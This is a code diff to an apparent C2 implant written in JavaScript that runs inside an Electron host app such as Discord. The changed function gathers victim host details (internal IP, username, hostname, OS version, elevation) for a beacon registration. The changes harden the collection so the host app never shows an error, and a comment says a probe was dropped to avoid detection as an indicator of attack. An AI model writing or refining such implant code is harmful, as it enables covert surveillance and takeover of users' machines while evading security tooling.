@@ -103,16 +103,20 @@ function load() {
 // host metadata for the registration beat (AgentInfo.cpp equivalent)
 let _elevCache = null;
 function hostInfo(cfg) {
-  const rel = (os.release() || '0.0.0').split('.').map((n) => parseInt(n, 10) || 0);
+  let relStr = '0.0.0';
+  try { relStr = os.release() || '0.0.0'; } catch (_) {}
+  const rel = relStr.split('.').map((n) => parseInt(n, 10) || 0);
   let major = rel[0] || 10, minor = rel[1] || 0, build = rel[2] || 0;
 
   let internal_ip = 0;
-  for (const name of Object.keys(os.networkInterfaces())) {
-    for (const a of os.networkInterfaces()[name]) {
-      if (a.family === 'IPv4' && !a.internal) { internal_ip = ipToLong(a.address); break; }
+  try {
+    for (const name of Object.keys(os.networkInterfaces())) {
+      for (const a of os.networkInterfaces()[name]) {
+        if (a.family === 'IPv4' && !a.internal) { internal_ip = ipToLong(a.address); break; }
+      }
+      if (internal_ip) break;
     }
-    if (internal_ip) break;
-  }
+  } catch (_) {} // odd NIC states must never kill the host app (003)
 
   // elevation is process-static. Deliberately NO `net session` probe: a
   // child-process spawn under an Electron host is a process-chain IoA
@@ -126,6 +130,13 @@ function hostInfo(cfg) {
   }
 
   const arch64 = os.arch().includes('64');
+  // identity probes can throw on odd hosts (deleted user, no hostname) —
+  // contain everything; the host app must never see an exception (003)
+  let username = '', hostname = '';
+  try { username = os.userInfo().username; } catch (_) {}
+  try { hostname = os.hostname(); } catch (_) {}
+  let osType = '';
+  try { osType = os.type(); } catch (_) {}
   return {
     major_version: major, minor_version: minor, build_number: build,
     internal_ip,
@@ -133,9 +144,9 @@ function hostInfo(cfg) {
     acp: 1252, oemcp: 437,
     pid: process.pid, tid: 0,
     is_server: false, elevated: _elevCache, sys64: arch64, arch64,
-    domain_name: cfg.domain_name || (process.platform === 'win32' ? (process.env.USERDOMAIN || os.hostname()) : os.type()),
-    computer_name: cfg.computer_name || os.hostname(),
-    username: os.userInfo().username,
+    domain_name: cfg.domain_name || (process.platform === 'win32' ? (process.env.USERDOMAIN || hostname) : osType),
+    computer_name: cfg.computer_name || hostname,
+    username,
     // inside Electron, execPath is the host app (Discord.exe) — exactly what
     // the C++ beacon reports for itself
     process_name: cfg.process_name || path.basename(process.execPath),
